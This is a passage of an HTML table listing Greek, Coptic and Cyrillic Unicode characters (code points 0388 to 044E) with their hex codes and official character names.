<td style="text-align:center">Έ</td>
<td style="text-align:center">0388</td>
<td style="text-align:center">GREEK CAPITAL LETTER EPSILON WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">Ή</td>
<td style="text-align:center">0389</td>
<td style="text-align:center">GREEK CAPITAL LETTER ETA WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">Ί</td>
<td style="text-align:center">038A</td>
<td style="text-align:center">GREEK CAPITAL LETTER IOTA WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">Ό</td>
<td style="text-align:center">038C</td>
<td style="text-align:center">GREEK CAPITAL LETTER OMICRON WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">Ύ</td>
<td style="text-align:center">038E</td>
<td style="text-align:center">GREEK CAPITAL LETTER UPSILON WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">Ώ</td>
<td style="text-align:center">038F</td>
<td style="text-align:center">GREEK CAPITAL LETTER OMEGA WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">ΐ</td>
<td style="text-align:center">0390</td>
<td style="text-align:center">GREEK SMALL LETTER IOTA WITH DIALYTIKA AND TONOS</td>
</tr>
<tr>
<td style="text-align:center">Α</td>
<td style="text-align:center">0391</td>
<td style="text-align:center">GREEK CAPITAL LETTER ALPHA</td>
</tr>
<tr>
<td style="text-align:center">Β</td>
<td style="text-align:center">0392</td>
<td style="text-align:center">GREEK CAPITAL LETTER BETA</td>
</tr>
<tr>
<td style="text-align:center">Γ</td>
<td style="text-align:center">0393</td>
<td style="text-align:center">GREEK CAPITAL LETTER GAMMA</td>
</tr>
<tr>
<td style="text-align:center">Δ</td>
<td style="text-align:center">0394</td>
<td style="text-align:center">GREEK CAPITAL LETTER DELTA</td>
</tr>
<tr>
<td style="text-align:center">Ε</td>
<td style="text-align:center">0395</td>
<td style="text-align:center">GREEK CAPITAL LETTER EPSILON</td>
</tr>
<tr>
<td style="text-align:center">Ζ</td>
<td style="text-align:center">0396</td>
<td style="text-align:center">GREEK CAPITAL LETTER ZETA</td>
</tr>
<tr>
<td style="text-align:center">Η</td>
<td style="text-align:center">0397</td>
<td style="text-align:center">GREEK CAPITAL LETTER ETA</td>
</tr>
<tr>
<td style="text-align:center">Θ</td>
<td style="text-align:center">0398</td>
<td style="text-align:center">GREEK CAPITAL LETTER THETA</td>
</tr>
<tr>
<td style="text-align:center">Ι</td>
<td style="text-align:center">0399</td>
<td style="text-align:center">GREEK CAPITAL LETTER IOTA</td>
</tr>
<tr>
<td style="text-align:center">Κ</td>
<td style="text-align:center">039A</td>
<td style="text-align:center">GREEK CAPITAL LETTER KAPPA</td>
</tr>
<tr>
<td style="text-align:center">Λ</td>
<td style="text-align:center">039B</td>
<td style="text-align:center">GREEK CAPITAL LETTER LAMBDA</td>
</tr>
<tr>
<td style="text-align:center">Μ</td>
<td style="text-align:center">039C</td>
<td style="text-align:center">GREEK CAPITAL LETTER MU</td>
</tr>
<tr>
<td style="text-align:center">Ν</td>
<td style="text-align:center">039D</td>
<td style="text-align:center">GREEK CAPITAL LETTER NU</td>
</tr>
<tr>
<td style="text-align:center">Ξ</td>
<td style="text-align:center">039E</td>
<td style="text-align:center">GREEK CAPITAL LETTER XI</td>
</tr>
<tr>
<td style="text-align:center">Ο</td>
<td style="text-align:center">039F</td>
<td style="text-align:center">GREEK CAPITAL LETTER OMICRON</td>
</tr>
<tr>
<td style="text-align:center">Π</td>
<td style="text-align:center">03A0</td>
<td style="text-align:center">GREEK CAPITAL LETTER PI</td>
</tr>
<tr>
<td style="text-align:center">Ρ</td>
<td style="text-align:center">03A1</td>
<td style="text-align:center">GREEK CAPITAL LETTER RHO</td>
</tr>
<tr>
<td style="text-align:center">Σ</td>
<td style="text-align:center">03A3</td>
<td style="text-align:center">GREEK CAPITAL LETTER SIGMA</td>
</tr>
<tr>
<td style="text-align:center">Τ</td>
<td style="text-align:center">03A4</td>
<td style="text-align:center">GREEK CAPITAL LETTER TAU</td>
</tr>
<tr>
<td style="text-align:center">Υ</td>
<td style="text-align:center">03A5</td>
<td style="text-align:center">GREEK CAPITAL LETTER UPSILON</td>
</tr>
<tr>
<td style="text-align:center">Φ</td>
<td style="text-align:center">03A6</td>
<td style="text-align:center">GREEK CAPITAL LETTER PHI</td>
</tr>
<tr>
<td style="text-align:center">Χ</td>
<td style="text-align:center">03A7</td>
<td style="text-align:center">GREEK CAPITAL LETTER CHI</td>
</tr>
<tr>
<td style="text-align:center">Ψ</td>
<td style="text-align:center">03A8</td>
<td style="text-align:center">GREEK CAPITAL LETTER PSI</td>
</tr>
<tr>
<td style="text-align:center">Ω</td>
<td style="text-align:center">03A9</td>
<td style="text-align:center">GREEK CAPITAL LETTER OMEGA</td>
</tr>
<tr>
<td style="text-align:center">Ϊ</td>
<td style="text-align:center">03AA</td>
<td style="text-align:center">GREEK CAPITAL LETTER IOTA WITH DIALYTIKA</td>
</tr>
<tr>
<td style="text-align:center">Ϋ</td>
<td style="text-align:center">03AB</td>
<td style="text-align:center">GREEK CAPITAL LETTER UPSILON WITH DIALYTIKA</td>
</tr>
<tr>
<td style="text-align:center">ά</td>
<td style="text-align:center">03AC</td>
<td style="text-align:center">GREEK SMALL LETTER ALPHA WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">έ</td>
<td style="text-align:center">03AD</td>
<td style="text-align:center">GREEK SMALL LETTER EPSILON WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">ή</td>
<td style="text-align:center">03AE</td>
<td style="text-align:center">GREEK SMALL LETTER ETA WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">ί</td>
<td style="text-align:center">03AF</td>
<td style="text-align:center">GREEK SMALL LETTER IOTA WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">ΰ</td>
<td style="text-align:center">03B0</td>
<td style="text-align:center">GREEK SMALL LETTER UPSILON WITH DIALYTIKA AND TONOS</td>
</tr>
<tr>
<td style="text-align:center">α</td>
<td style="text-align:center">03B1</td>
<td style="text-align:center">GREEK SMALL LETTER ALPHA</td>
</tr>
<tr>
<td style="text-align:center">β</td>
<td style="text-align:center">03B2</td>
<td style="text-align:center">GREEK SMALL LETTER BETA</td>
</tr>
<tr>
<td style="text-align:center">γ</td>
<td style="text-align:center">03B3</td>
<td style="text-align:center">GREEK SMALL LETTER GAMMA</td>
</tr>
<tr>
<td style="text-align:center">δ</td>
<td style="text-align:center">03B4</td>
<td style="text-align:center">GREEK SMALL LETTER DELTA</td>
</tr>
<tr>
<td style="text-align:center">ε</td>
<td style="text-align:center">03B5</td>
<td style="text-align:center">GREEK SMALL LETTER EPSILON</td>
</tr>
<tr>
<td style="text-align:center">ζ</td>
<td style="text-align:center">03B6</td>
<td style="text-align:center">GREEK SMALL LETTER ZETA</td>
</tr>
<tr>
<td style="text-align:center">η</td>
<td style="text-align:center">03B7</td>
<td style="text-align:center">GREEK SMALL LETTER ETA</td>
</tr>
<tr>
<td style="text-align:center">θ</td>
<td style="text-align:center">03B8</td>
<td style="text-align:center">GREEK SMALL LETTER THETA</td>
</tr>
<tr>
<td style="text-align:center">ι</td>
<td style="text-align:center">03B9</td>
<td style="text-align:center">GREEK SMALL LETTER IOTA</td>
</tr>
<tr>
<td style="text-align:center">κ</td>
<td style="text-align:center">03BA</td>
<td style="text-align:center">GREEK SMALL LETTER KAPPA</td>
</tr>
<tr>
<td style="text-align:center">λ</td>
<td style="text-align:center">03BB</td>
<td style="text-align:center">GREEK SMALL LETTER LAMBDA</td>
</tr>
<tr>
<td style="text-align:center">μ</td>
<td style="text-align:center">03BC</td>
<td style="text-align:center">GREEK SMALL LETTER MU</td>
</tr>
<tr>
<td style="text-align:center">ν</td>
<td style="text-align:center">03BD</td>
<td style="text-align:center">GREEK SMALL LETTER NU</td>
</tr>
<tr>
<td style="text-align:center">ξ</td>
<td style="text-align:center">03BE</td>
<td style="text-align:center">GREEK SMALL LETTER XI</td>
</tr>
<tr>
<td style="text-align:center">ο</td>
<td style="text-align:center">03BF</td>
<td style="text-align:center">GREEK SMALL LETTER OMICRON</td>
</tr>
<tr>
<td style="text-align:center">π</td>
<td style="text-align:center">03C0</td>
<td style="text-align:center">GREEK SMALL LETTER PI</td>
</tr>
<tr>
<td style="text-align:center">ρ</td>
<td style="text-align:center">03C1</td>
<td style="text-align:center">GREEK SMALL LETTER RHO</td>
</tr>
<tr>
<td style="text-align:center">ς</td>
<td style="text-align:center">03C2</td>
<td style="text-align:center">GREEK SMALL LETTER FINAL SIGMA</td>
</tr>
<tr>
<td style="text-align:center">σ</td>
<td style="text-align:center">03C3</td>
<td style="text-align:center">GREEK SMALL LETTER SIGMA</td>
</tr>
<tr>
<td style="text-align:center">τ</td>
<td style="text-align:center">03C4</td>
<td style="text-align:center">GREEK SMALL LETTER TAU</td>
</tr>
<tr>
<td style="text-align:center">υ</td>
<td style="text-align:center">03C5</td>
<td style="text-align:center">GREEK SMALL LETTER UPSILON</td>
</tr>
<tr>
<td style="text-align:center">φ</td>
<td style="text-align:center">03C6</td>
<td style="text-align:center">GREEK SMALL LETTER PHI</td>
</tr>
<tr>
<td style="text-align:center">χ</td>
<td style="text-align:center">03C7</td>
<td style="text-align:center">GREEK SMALL LETTER CHI</td>
</tr>
<tr>
<td style="text-align:center">ψ</td>
<td style="text-align:center">03C8</td>
<td style="text-align:center">GREEK SMALL LETTER PSI</td>
</tr>
<tr>
<td style="text-align:center">ω</td>
<td style="text-align:center">03C9</td>
<td style="text-align:center">GREEK SMALL LETTER OMEGA</td>
</tr>
<tr>
<td style="text-align:center">ϊ</td>
<td style="text-align:center">03CA</td>
<td style="text-align:center">GREEK SMALL LETTER IOTA WITH DIALYTIKA</td>
</tr>
<tr>
<td style="text-align:center">ϋ</td>
<td style="text-align:center">03CB</td>
<td style="text-align:center">GREEK SMALL LETTER UPSILON WITH DIALYTIKA</td>
</tr>
<tr>
<td style="text-align:center">ό</td>
<td style="text-align:center">03CC</td>
<td style="text-align:center">GREEK SMALL LETTER OMICRON WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">ύ</td>
<td style="text-align:center">03CD</td>
<td style="text-align:center">GREEK SMALL LETTER UPSILON WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">ώ</td>
<td style="text-align:center">03CE</td>
<td style="text-align:center">GREEK SMALL LETTER OMEGA WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">Ϗ</td>
<td style="text-align:center">03CF</td>
<td style="text-align:center">GREEK CAPITAL KAI SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ϐ</td>
<td style="text-align:center">03D0</td>
<td style="text-align:center">GREEK BETA SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ϑ</td>
<td style="text-align:center">03D1</td>
<td style="text-align:center">GREEK THETA SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ϒ</td>
<td style="text-align:center">03D2</td>
<td style="text-align:center">GREEK UPSILON WITH HOOK SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ϓ</td>
<td style="text-align:center">03D3</td>
<td style="text-align:center">GREEK UPSILON WITH ACUTE AND HOOK SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ϔ</td>
<td style="text-align:center">03D4</td>
<td style="text-align:center">GREEK UPSILON WITH DIAERESIS AND HOOK SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ϕ</td>
<td style="text-align:center">03D5</td>
<td style="text-align:center">GREEK PHI SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ϖ</td>
<td style="text-align:center">03D6</td>
<td style="text-align:center">GREEK PI SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ϗ</td>
<td style="text-align:center">03D7</td>
<td style="text-align:center">GREEK KAI SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">Ϙ</td>
<td style="text-align:center">03D8</td>
<td style="text-align:center">GREEK LETTER ARCHAIC KOPPA</td>
</tr>
<tr>
<td style="text-align:center">ϙ</td>
<td style="text-align:center">03D9</td>
<td style="text-align:center">GREEK SMALL LETTER ARCHAIC KOPPA</td>
</tr>
<tr>
<td style="text-align:center">Ϛ</td>
<td style="text-align:center">03DA</td>
<td style="text-align:center">GREEK LETTER STIGMA</td>
</tr>
<tr>
<td style="text-align:center">ϛ</td>
<td style="text-align:center">03DB</td>
<td style="text-align:center">GREEK SMALL LETTER STIGMA</td>
</tr>
<tr>
<td style="text-align:center">Ϝ</td>
<td style="text-align:center">03DC</td>
<td style="text-align:center">GREEK LETTER DIGAMMA</td>
</tr>
<tr>
<td style="text-align:center">ϝ</td>
<td style="text-align:center">03DD</td>
<td style="text-align:center">GREEK SMALL LETTER DIGAMMA</td>
</tr>
<tr>
<td style="text-align:center">Ϟ</td>
<td style="text-align:center">03DE</td>
<td style="text-align:center">GREEK LETTER KOPPA</td>
</tr>
<tr>
<td style="text-align:center">ϟ</td>
<td style="text-align:center">03DF</td>
<td style="text-align:center">GREEK SMALL LETTER KOPPA</td>
</tr>
<tr>
<td style="text-align:center">Ϡ</td>
<td style="text-align:center">03E0</td>
<td style="text-align:center">GREEK LETTER SAMPI</td>
</tr>
<tr>
<td style="text-align:center">ϡ</td>
<td style="text-align:center">03E1</td>
<td style="text-align:center">GREEK SMALL LETTER SAMPI</td>
</tr>
<tr>
<td style="text-align:center">Ϣ</td>
<td style="text-align:center">03E2</td>
<td style="text-align:center">COPTIC CAPITAL LETTER SHEI</td>
</tr>
<tr>
<td style="text-align:center">ϣ</td>
<td style="text-align:center">03E3</td>
<td style="text-align:center">COPTIC SMALL LETTER SHEI</td>
</tr>
<tr>
<td style="text-align:center">Ϥ</td>
<td style="text-align:center">03E4</td>
<td style="text-align:center">COPTIC CAPITAL LETTER FEI</td>
</tr>
<tr>
<td style="text-align:center">ϥ</td>
<td style="text-align:center">03E5</td>
<td style="text-align:center">COPTIC SMALL LETTER FEI</td>
</tr>
<tr>
<td style="text-align:center">Ϧ</td>
<td style="text-align:center">03E6</td>
<td style="text-align:center">COPTIC CAPITAL LETTER KHEI</td>
</tr>
<tr>
<td style="text-align:center">ϧ</td>
<td style="text-align:center">03E7</td>
<td style="text-align:center">COPTIC SMALL LETTER KHEI</td>
</tr>
<tr>
<td style="text-align:center">Ϩ</td>
<td style="text-align:center">03E8</td>
<td style="text-align:center">COPTIC CAPITAL LETTER HORI</td>
</tr>
<tr>
<td style="text-align:center">ϩ</td>
<td style="text-align:center">03E9</td>
<td style="text-align:center">COPTIC SMALL LETTER HORI</td>
</tr>
<tr>
<td style="text-align:center">Ϫ</td>
<td style="text-align:center">03EA</td>
<td style="text-align:center">COPTIC CAPITAL LETTER GANGIA</td>
</tr>
<tr>
<td style="text-align:center">ϫ</td>
<td style="text-align:center">03EB</td>
<td style="text-align:center">COPTIC SMALL LETTER GANGIA</td>
</tr>
<tr>
<td style="text-align:center">Ϭ</td>
<td style="text-align:center">03EC</td>
<td style="text-align:center">COPTIC CAPITAL LETTER SHIMA</td>
</tr>
<tr>
<td style="text-align:center">ϭ</td>
<td style="text-align:center">03ED</td>
<td style="text-align:center">COPTIC SMALL LETTER SHIMA</td>
</tr>
<tr>
<td style="text-align:center">Ϯ</td>
<td style="text-align:center">03EE</td>
<td style="text-align:center">COPTIC CAPITAL LETTER DEI</td>
</tr>
<tr>
<td style="text-align:center">ϯ</td>
<td style="text-align:center">03EF</td>
<td style="text-align:center">COPTIC SMALL LETTER DEI</td>
</tr>
<tr>
<td style="text-align:center">ϰ</td>
<td style="text-align:center">03F0</td>
<td style="text-align:center">GREEK KAPPA SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ϱ</td>
<td style="text-align:center">03F1</td>
<td style="text-align:center">GREEK RHO SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ϲ</td>
<td style="text-align:center">03F2</td>
<td style="text-align:center">GREEK LUNATE SIGMA SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ϳ</td>
<td style="text-align:center">03F3</td>
<td style="text-align:center">GREEK LETTER YOT</td>
</tr>
<tr>
<td style="text-align:center">ϴ</td>
<td style="text-align:center">03F4</td>
<td style="text-align:center">GREEK CAPITAL THETA SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ϵ</td>
<td style="text-align:center">03F5</td>
<td style="text-align:center">GREEK LUNATE EPSILON SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">϶</td>
<td style="text-align:center">03F6</td>
<td style="text-align:center">GREEK REVERSED LUNATE EPSILON SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">Ϸ</td>
<td style="text-align:center">03F7</td>
<td style="text-align:center">GREEK CAPITAL LETTER SHO</td>
</tr>
<tr>
<td style="text-align:center">ϸ</td>
<td style="text-align:center">03F8</td>
<td style="text-align:center">GREEK SMALL LETTER SHO</td>
</tr>
<tr>
<td style="text-align:center">Ϲ</td>
<td style="text-align:center">03F9</td>
<td style="text-align:center">GREEK CAPITAL LUNATE SIGMA SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">Ϻ</td>
<td style="text-align:center">03FA</td>
<td style="text-align:center">GREEK CAPITAL LETTER SAN</td>
</tr>
<tr>
<td style="text-align:center">ϻ</td>
<td style="text-align:center">03FB</td>
<td style="text-align:center">GREEK SMALL LETTER SAN</td>
</tr>
<tr>
<td style="text-align:center">ϼ</td>
<td style="text-align:center">03FC</td>
<td style="text-align:center">GREEK RHO WITH STROKE SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">Ͻ</td>
<td style="text-align:center">03FD</td>
<td style="text-align:center">GREEK CAPITAL REVERSED LUNATE SIGMA SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">Ͼ</td>
<td style="text-align:center">03FE</td>
<td style="text-align:center">GREEK CAPITAL DOTTED LUNATE SIGMA SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">Ͽ</td>
<td style="text-align:center">03FF</td>
<td style="text-align:center">GREEK CAPITAL REVERSED DOTTED LUNATE SIGMA SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">Ѐ</td>
<td style="text-align:center">0400</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER IE WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Ё</td>
<td style="text-align:center">0401</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER IO</td>
</tr>
<tr>
<td style="text-align:center">Ђ</td>
<td style="text-align:center">0402</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER DJE</td>
</tr>
<tr>
<td style="text-align:center">Ѓ</td>
<td style="text-align:center">0403</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER GJE</td>
</tr>
<tr>
<td style="text-align:center">Є</td>
<td style="text-align:center">0404</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER UKRAINIAN IE</td>
</tr>
<tr>
<td style="text-align:center">Ѕ</td>
<td style="text-align:center">0405</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER DZE</td>
</tr>
<tr>
<td style="text-align:center">І</td>
<td style="text-align:center">0406</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER BYELORUSSIAN-UKRAINIAN I</td>
</tr>
<tr>
<td style="text-align:center">Ї</td>
<td style="text-align:center">0407</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER YI</td>
</tr>
<tr>
<td style="text-align:center">Ј</td>
<td style="text-align:center">0408</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER JE</td>
</tr>
<tr>
<td style="text-align:center">Љ</td>
<td style="text-align:center">0409</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER LJE</td>
</tr>
<tr>
<td style="text-align:center">Њ</td>
<td style="text-align:center">040A</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER NJE</td>
</tr>
<tr>
<td style="text-align:center">Ћ</td>
<td style="text-align:center">040B</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER TSHE</td>
</tr>
<tr>
<td style="text-align:center">Ќ</td>
<td style="text-align:center">040C</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KJE</td>
</tr>
<tr>
<td style="text-align:center">Ѝ</td>
<td style="text-align:center">040D</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER I WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Ў</td>
<td style="text-align:center">040E</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER SHORT U</td>
</tr>
<tr>
<td style="text-align:center">Џ</td>
<td style="text-align:center">040F</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER DZHE</td>
</tr>
<tr>
<td style="text-align:center">А</td>
<td style="text-align:center">0410</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER A</td>
</tr>
<tr>
<td style="text-align:center">Б</td>
<td style="text-align:center">0411</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER BE</td>
</tr>
<tr>
<td style="text-align:center">В</td>
<td style="text-align:center">0412</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER VE</td>
</tr>
<tr>
<td style="text-align:center">Г</td>
<td style="text-align:center">0413</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER GHE</td>
</tr>
<tr>
<td style="text-align:center">Д</td>
<td style="text-align:center">0414</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER DE</td>
</tr>
<tr>
<td style="text-align:center">Е</td>
<td style="text-align:center">0415</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER IE</td>
</tr>
<tr>
<td style="text-align:center">Ж</td>
<td style="text-align:center">0416</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ZHE</td>
</tr>
<tr>
<td style="text-align:center">З</td>
<td style="text-align:center">0417</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ZE</td>
</tr>
<tr>
<td style="text-align:center">И</td>
<td style="text-align:center">0418</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER I</td>
</tr>
<tr>
<td style="text-align:center">Й</td>
<td style="text-align:center">0419</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER SHORT I</td>
</tr>
<tr>
<td style="text-align:center">К</td>
<td style="text-align:center">041A</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KA</td>
</tr>
<tr>
<td style="text-align:center">Л</td>
<td style="text-align:center">041B</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER EL</td>
</tr>
<tr>
<td style="text-align:center">М</td>
<td style="text-align:center">041C</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER EM</td>
</tr>
<tr>
<td style="text-align:center">Н</td>
<td style="text-align:center">041D</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER EN</td>
</tr>
<tr>
<td style="text-align:center">О</td>
<td style="text-align:center">041E</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER O</td>
</tr>
<tr>
<td style="text-align:center">П</td>
<td style="text-align:center">041F</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER PE</td>
</tr>
<tr>
<td style="text-align:center">Р</td>
<td style="text-align:center">0420</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ER</td>
</tr>
<tr>
<td style="text-align:center">С</td>
<td style="text-align:center">0421</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ES</td>
</tr>
<tr>
<td style="text-align:center">Т</td>
<td style="text-align:center">0422</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER TE</td>
</tr>
<tr>
<td style="text-align:center">У</td>
<td style="text-align:center">0423</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER U</td>
</tr>
<tr>
<td style="text-align:center">Ф</td>
<td style="text-align:center">0424</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER EF</td>
</tr>
<tr>
<td style="text-align:center">Х</td>
<td style="text-align:center">0425</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER HA</td>
</tr>
<tr>
<td style="text-align:center">Ц</td>
<td style="text-align:center">0426</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER TSE</td>
</tr>
<tr>
<td style="text-align:center">Ч</td>
<td style="text-align:center">0427</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER CHE</td>
</tr>
<tr>
<td style="text-align:center">Ш</td>
<td style="text-align:center">0428</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER SHA</td>
</tr>
<tr>
<td style="text-align:center">Щ</td>
<td style="text-align:center">0429</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER SHCHA</td>
</tr>
<tr>
<td style="text-align:center">Ъ</td>
<td style="text-align:center">042A</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER HARD SIGN</td>
</tr>
<tr>
<td style="text-align:center">Ы</td>
<td style="text-align:center">042B</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER YERU</td>
</tr>
<tr>
<td style="text-align:center">Ь</td>
<td style="text-align:center">042C</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER SOFT SIGN</td>
</tr>
<tr>
<td style="text-align:center">Э</td>
<td style="text-align:center">042D</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER E</td>
</tr>
<tr>
<td style="text-align:center">Ю</td>
<td style="text-align:center">042E</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER YU</td>
</tr>
<tr>
<td style="text-align:center">Я</td>
<td style="text-align:center">042F</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER YA</td>
</tr>
<tr>
<td style="text-align:center">а</td>
<td style="text-align:center">0430</td>
<td style="text-align:center">CYRILLIC SMALL LETTER A</td>
</tr>
<tr>
<td style="text-align:center">б</td>
<td style="text-align:center">0431</td>
<td style="text-align:center">CYRILLIC SMALL LETTER BE</td>
</tr>
<tr>
<td style="text-align:center">в</td>
<td style="text-align:center">0432</td>
<td style="text-align:center">CYRILLIC SMALL LETTER VE</td>
</tr>
<tr>
<td style="text-align:center">г</td>
<td style="text-align:center">0433</td>
<td style="text-align:center">CYRILLIC SMALL LETTER GHE</td>
</tr>
<tr>
<td style="text-align:center">д</td>
<td style="text-align:center">0434</td>
<td style="text-align:center">CYRILLIC SMALL LETTER DE</td>
</tr>
<tr>
<td style="text-align:center">е</td>
<td style="text-align:center">0435</td>
<td style="text-align:center">CYRILLIC SMALL LETTER IE</td>
</tr>
<tr>
<td style="text-align:center">ж</td>
<td style="text-align:center">0436</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ZHE</td>
</tr>
<tr>
<td style="text-align:center">з</td>
<td style="text-align:center">0437</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ZE</td>
</tr>
<tr>
<td style="text-align:center">и</td>
<td style="text-align:center">0438</td>
<td style="text-align:center">CYRILLIC SMALL LETTER I</td>
</tr>
<tr>
<td style="text-align:center">й</td>
<td style="text-align:center">0439</td>
<td style="text-align:center">CYRILLIC SMALL LETTER SHORT I</td>
</tr>
<tr>
<td style="text-align:center">к</td>
<td style="text-align:center">043A</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KA</td>
</tr>
<tr>
<td style="text-align:center">л</td>
<td style="text-align:center">043B</td>
<td style="text-align:center">CYRILLIC SMALL LETTER EL</td>
</tr>
<tr>
<td style="text-align:center">м</td>
<td style="text-align:center">043C</td>
<td style="text-align:center">CYRILLIC SMALL LETTER EM</td>
</tr>
<tr>
<td style="text-align:center">н</td>
<td style="text-align:center">043D</td>
<td style="text-align:center">CYRILLIC SMALL LETTER EN</td>
</tr>
<tr>
<td style="text-align:center">о</td>
<td style="text-align:center">043E</td>
<td style="text-align:center">CYRILLIC SMALL LETTER O</td>
</tr>
<tr>
<td style="text-align:center">п</td>
<td style="text-align:center">043F</td>
<td style="text-align:center">CYRILLIC SMALL LETTER PE</td>
</tr>
<tr>
<td style="text-align:center">р</td>
<td style="text-align:center">0440</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ER</td>
</tr>
<tr>
<td style="text-align:center">с</td>
<td style="text-align:center">0441</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ES</td>
</tr>
<tr>
<td style="text-align:center">т</td>
<td style="text-align:center">0442</td>
<td style="text-align:center">CYRILLIC SMALL LETTER TE</td>
</tr>
<tr>
<td style="text-align:center">у</td>
<td style="text-align:center">0443</td>
<td style="text-align:center">CYRILLIC SMALL LETTER U</td>
</tr>
<tr>
<td style="text-align:center">ф</td>
<td style="text-align:center">0444</td>
<td style="text-align:center">CYRILLIC SMALL LETTER EF</td>
</tr>
<tr>
<td style="text-align:center">х</td>
<td style="text-align:center">0445</td>
<td style="text-align:center">CYRILLIC SMALL LETTER HA</td>
</tr>
<tr>
<td style="text-align:center">ц</td>
<td style="text-align:center">0446</td>
<td style="text-align:center">CYRILLIC SMALL LETTER TSE</td>
</tr>
<tr>
<td style="text-align:center">ч</td>
<td style="text-align:center">0447</td>
<td style="text-align:center">CYRILLIC SMALL LETTER CHE</td>
</tr>
<tr>
<td style="text-align:center">ш</td>
<td style="text-align:center">0448</td>
<td style="text-align:center">CYRILLIC SMALL LETTER SHA</td>
</tr>
<tr>
<td style="text-align:center">щ</td>
<td style="text-align:center">0449</td>
<td style="text-align:center">CYRILLIC SMALL LETTER SHCHA</td>
</tr>
<tr>
<td style="text-align:center">ъ</td>
<td style="text-align:center">044A</td>
<td style="text-align:center">CYRILLIC SMALL LETTER HARD SIGN</td>
</tr>
<tr>
<td style="text-align:center">ы</td>
<td style="text-align:center">044B</td>
<td style="text-align:center">CYRILLIC SMALL LETTER YERU</td>
</tr>
<tr>
<td style="text-align:center">ь</td>
<td style="text-align:center">044C</td>
<td style="text-align:center">CYRILLIC SMALL LETTER SOFT SIGN</td>
</tr>
<tr>
<td style="text-align:center">э</td>
<td style="text-align:center">044D</td>
<td style="text-align:center">CYRILLIC SMALL LETTER E</td>
</tr>
<tr>
<td style="text-align:center">ю</td>
<td style="text-align:center">044E</td>
<td style="text-align:center">CYRILLIC SMALL LETTER YU</td>
